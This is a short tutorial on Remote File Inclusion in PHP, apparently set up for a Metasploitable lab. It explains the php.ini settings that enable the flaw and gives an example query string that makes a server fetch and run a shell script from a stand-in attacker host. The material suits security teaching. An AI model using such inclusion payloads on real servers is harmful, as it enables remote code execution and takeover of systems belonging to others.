

 Remote File Inclusion (RFI) 

# What is RFI?

 Remote File Inclusion (RFI) is an advanced form of file inclusion vulnerability.
 Unlike Local File Inclusion (LFI) (which accesses files on the same server), RFI allows us to include files from an external server.
 This means we can inject and execute malicious PHP files hosted on another machine.

---

# Why RFI is Dangerous

If exploited, an attacker can:

 Execute remote code
 Run system commands
 Get a reverse shell
 Gain full control over the server

---

# Requirement for RFI

RFI only works if certain PHP settings are enabled on the target server:

 `allow_url_fopen = On`
 `allow_url_include = On`

These settings allow PHP to load files from external URLs.

---

# Where to Find These Settings

On the target machine (e.g., Metasploitable), open the PHP configuration file:

```bash
sudo nano /etc/php5/cgi/php.ini
```

Search for:

```ini
allow_url_fopen = On
allow_url_include = On
```

If both are enabled → RFI is possible

---

# Apply Changes

After checking or modifying the settings, restart the web server:

```bash
sudo service apache2 restart
```

---

# How RFI Works

 The application uses a parameter like:

  ```
  ?page=somefile.php
  ```
 Instead of a local file, attacker provides a remote URL:

  ```
  ?page=http://attacker.com/shell.php
  ```
 The server loads and executes the remote PHP file

---

# Key Difference (LFI vs RFI)

| Type | Access                |
| ---- | --------------------- |
| LFI  | Local server files    |
| RFI  | Remote external files |

---

# Key Takeaway

 LFI → Read files
 RFI → Execute remote code (more dangerous)

